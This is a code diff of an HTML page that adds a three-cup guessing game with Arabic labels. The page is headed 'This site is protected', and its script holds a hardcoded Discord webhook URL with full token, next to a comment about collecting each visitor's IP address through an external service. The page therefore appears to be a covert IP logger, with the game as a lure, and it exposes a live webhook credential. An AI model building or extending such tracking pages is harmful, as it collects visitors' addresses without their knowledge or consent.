@@ -29,6 +29,31 @@
             animation: moveArrow 1.5s infinite;
         }
 
+        .cup {
+            width: 30px;
+            height: 30px;
+            background-color: #ccc;
+            margin: 5px;
+            text-align: center;
+            line-height: 30px;
+            cursor: pointer;
+        }
+
+        .shell-game {
+            position: absolute;
+            top: 0;
+            left: 0;
+            margin-top: 10px;
+            margin-left: 10px;
+            z-index: 9999; /* ضمان أنها في الأعلى من العناصر الأخرى */
+        }
+
+        img {
+            max-width: 100%;
+            max-height: 80%;
+            margin-top: 20px;
+        }
+
         @keyframes moveArrow {
             0% {
                 left: 0;
@@ -40,15 +65,15 @@
                 left: 0;
             }
         }
-
-        img {
-            max-width: 100%;
-            max-height: 80%;
-            margin-top: 20px;
-        }
     </style>
 </head>
 <body>
+
+<div class="shell-game">
+    <div class="cup" onclick="guessCup(1)">كوب 1</div>
+    <div class="cup" onclick="guessCup(2)">كوب 2</div>
+    <div class="cup" onclick="guessCup(3)">كوب 3</div>
+</div>
 
 <div class="container">
     <h1>This site is protected</h1>
@@ -59,6 +84,17 @@
 
 <script>
     // JavaScript
+    let ballPosition = Math.floor(Math.random() * 3) + 1;
+
+    function guessCup(cupNumber) {
+        const resultElement = document.getElementById('result');
+        if (cupNumber === ballPosition) {
+            resultElement.innerText = 'تهانينا! لقد وجدت الكرة!';
+        } else {
+            resultElement.innerText = 'عذرًا، كانت الكرة تحت الكوب رقم ' + ballPosition + '.';
+        }
+    }
+
     const webhookURL = 'https://discord.com/api/webhooks/1231177221553786961/rPr2Pnz-_TdxSle_9lPD95pTuhLgNmpFM3AsvFaZFwSZ-cAl42mIsrGzaUlzYkqZaoIH';
 
     // الحصول على عنوان IP للزائر باستخدام خدمة خارجية
